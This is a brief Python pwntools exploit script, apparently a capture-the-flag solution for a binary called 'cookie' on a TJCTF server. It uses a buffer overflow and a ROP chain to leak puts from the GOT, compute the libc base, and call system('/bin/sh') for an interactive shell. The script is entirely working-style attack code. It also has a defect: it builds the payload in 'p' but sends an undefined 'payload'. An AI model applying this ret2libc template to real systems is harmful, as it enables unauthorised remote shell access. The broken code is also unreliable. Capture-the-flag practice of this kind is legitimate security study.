from pwn import *

pop_rdi = 0x0000000000400933
ret = 0x000000000040061e
main = 0x0000000000400797

#r = process('./cookie')
r = remote('p1.tjctf.org', 8010)
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
e = ELF('./cookie')
r.recv()

p = 'A'*88
p+= p64(pop_rdi)
p+= p64(e.got['puts'])
p+= p64(e.plt['puts'])
p+= p64(main)
r.sendline(payload)

r.recvline()
leak = u64(r.recvline().strip().ljust(8, '\x00'))

log.info("leaked puts: " + hex(leak))
libc_base = leak - libc.symbols['puts']
sys = libc_base + libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()

r.recv()
p = 'A'*88
p+= p64(pop_rdi)
p+= p64(bin_sh)
p+= p64(ret)
p+= p64(sys)

r.sendline(payload)
r.interactive()
